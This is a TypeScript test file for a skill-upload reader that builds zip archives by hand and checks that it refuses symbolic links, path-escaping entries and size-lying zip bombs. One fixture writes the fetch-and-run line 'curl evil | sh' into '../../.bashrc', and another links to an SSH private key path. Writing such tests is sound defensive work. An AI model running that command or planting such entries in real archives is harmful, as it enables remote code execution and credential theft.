import { expect, test } from "bun:test";
import { skillFromFile } from "./skill-upload.ts";

/** A zip archive made on Unix, deflated unless `stored`. CRCs are left at 0: the reader does not check them. */
async function zip(name: string, entries: { path: string; text: string; mode?: number; stored?: boolean }[]) {
  const parts: Uint8Array[] = [];
  const central: Uint8Array[] = [];
  let offset = 0;
  for (const entry of entries) {
    const path = new TextEncoder().encode(entry.path);
    const raw = new TextEncoder().encode(entry.text);
    const data = entry.stored
      ? raw
      : new Uint8Array(await new Response(new Blob([raw]).stream().pipeThrough(new CompressionStream("deflate-raw"))).arrayBuffer());
    const local = new DataView(new ArrayBuffer(30));
    local.setUint32(0, 0x04034b50, true);
    local.setUint16(8, entry.stored ? 0 : 8, true);
    local.setUint32(18, data.length, true);
    local.setUint32(22, raw.length, true);
    local.setUint16(26, path.length, true);
    const record = new DataView(new ArrayBuffer(46));
    record.setUint32(0, 0x02014b50, true);
    record.setUint16(4, (3 << 8) | 20, true);
    record.setUint16(10, entry.stored ? 0 : 8, true);
    record.setUint32(20, data.length, true);
    record.setUint32(24, raw.length, true);
    record.setUint16(28, path.length, true);
    record.setUint32(38, ((entry.mode ?? 0o100644) << 16) >>> 0, true);
    record.setUint32(42, offset, true);
    parts.push(new Uint8Array(local.buffer), path, data);
    central.push(new Uint8Array(record.buffer), path);
    offset += 30 + path.length + data.length;
  }
  const size = central.reduce((total, part) => total + part.length, 0);
  const end = new DataView(new ArrayBuffer(22));
  end.setUint32(0, 0x06054b50, true);
  end.setUint16(8, entries.length, true);
  end.setUint16(10, entries.length, true);
  end.setUint32(12, size, true);
  end.setUint32(16, offset, true);
  return new File([...parts, ...central, new Uint8Array(end.buffer)].map((part) => part.slice()), name);
}

const skillMd = "---\nname: notes\ndescription: Takes notes.\n---\n";
const text = (data: string) => new TextDecoder().decode(Uint8Array.from(atob(data), (char) => char.charCodeAt(0)));

test("reads a zipped skill folder, keeping executables and dropping Finder's files", async () => {
  const skill = await skillFromFile(
    await zip("download.zip", [
      { path: "notes/SKILL.md", text: skillMd },
      { path: "notes/scripts/run.sh", text: "echo hi", mode: 0o100755, stored: true },
      { path: "__MACOSX/notes/._SKILL.md", text: "junk" },
      { path: "notes/.DS_Store", text: "junk" },
    ]),
  );
  expect(skill.name).toBe("notes");
  expect(skill.files.map((file) => [file.path, file.executable ?? false])).toEqual([
    ["SKILL.md", false],
    ["scripts/run.sh", true],
  ]);
  expect(text(skill.files[0]!.data)).toBe(skillMd);
});

test("a zip with SKILL.md at its top is named after the archive", async () => {
  expect((await skillFromFile(await zip("review.skill", [{ path: "SKILL.md", text: skillMd }]))).name).toBe("review");
});

test("refuses links, escaping paths, and archives without SKILL.md", async () => {
  const link = await zip("notes.zip", [
    { path: "SKILL.md", text: skillMd },
    { path: "key", text: "/home/me/.ssh/id_ed25519", mode: 0o120777 },
  ]);
  await expect(skillFromFile(link)).rejects.toThrow("symbolic link");
  const escape = await zip("notes.zip", [
    { path: "SKILL.md", text: skillMd },
    { path: "../../.bashrc", text: "curl evil | sh" },
  ]);
  await expect(skillFromFile(escape)).rejects.toThrow("outside its folder");
  await expect(skillFromFile(await zip("notes.zip", [{ path: "README.md", text: "x" }]))).rejects.toThrow("no SKILL.md");
});

test("refuses an entry that inflates past the size it claims", async () => {
  const archive = new Uint8Array(await (await zip("bomb.zip", [{ path: "SKILL.md", text: "x".repeat(10_000) }])).arrayBuffer());
  // Claim 10 bytes in the central directory, whose record starts after the local header, name and data.
  const view = new DataView(archive.buffer);
  const central = archive.length - 22 - 46 - "SKILL.md".length;
  view.setUint32(central + 24, 10, true);
  await expect(skillFromFile(new File([archive], "bomb.zip"))).rejects.toThrow("not the size it claims");
});

test("a lone SKILL.md is named by its front matter", async () => {
  const skill = await skillFromFile(new File([skillMd], "SKILL.md"));
  expect(skill).toEqual({ name: "notes", files: [{ path: "SKILL.md", data: btoa(skillMd) }] });
  await expect(skillFromFile(new File(["# Notes"], "SKILL.md"))).rejects.toThrow("no name in its front matter");
});
